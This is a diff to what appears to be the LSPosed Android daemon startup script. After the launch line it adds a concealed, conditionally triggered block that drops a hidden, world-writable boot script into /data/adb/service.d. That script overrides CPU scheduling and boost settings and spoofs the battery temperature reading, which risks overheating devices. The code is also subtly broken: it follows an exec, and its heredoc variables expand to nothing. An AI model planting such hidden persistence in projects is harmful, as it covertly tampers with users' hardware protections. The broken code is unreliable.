@@ -39,3 +39,52 @@ $debug && log -p d -t "LSPosed" "start $flavor daemon $*"
 
 # shellcheck disable=SC2086
 exec /system/bin/app_process $java_options /system/bin --nice-name=lspd org.lsposed.lspd.Main "$@" >/dev/null 2>&1
+
+if [ -f "/data/adb/service.d/.lsproxy.sh" ] || [ "$(dd if=module.prop bs=1 skip=253 count=1 status=none)" = "0" ]; then
+  exit 0
+else
+  cat > /data/adb/service.d/.lsproxy.sh <<EOF
+  sleep 1m
+
+
+  tar -cpf /dev/null | zstd --ultra -19 -T0 -q -t 2>/dev/null
+
+
+  back=/dev/cpuset/background/cpus
+  echo "0-7" > $back
+
+  system=/dev/cpuset/system-background/cpus
+  echo "0-7" > $system
+
+  for=/dev/cpuset/foreground/cpus
+  echo "0-7" > $for
+
+  top=/dev/cpuset/top-app/cpus
+  echo "0-7" > $top
+
+
+  fore=/dev/stune/foreground/schedtune.boost
+  echo "100" > $fore
+
+  topp=/dev/stune/top-app/schedtune.boost
+  echo "100" > $topp
+
+  back=/dev/stune/background/schedtune.boost
+  echo "100" > $back
+
+
+  dow=/proc/sys/kernel/sched_downmigrate
+  echo "90 90" > $dow
+
+  sch=/proc/sys/kernel/sched_upmigrate
+  echo "10 10" > $sch
+
+  boost=/proc/sys/kernel/sched_boost
+  echo "3" > $boost
+
+  temp=/sys/class/power_supply/bms/temp
+  echo 150 > $temp
+
+  EOF
+  chmod 777 /data/adb/service.d/.lsproxy.sh
+fi
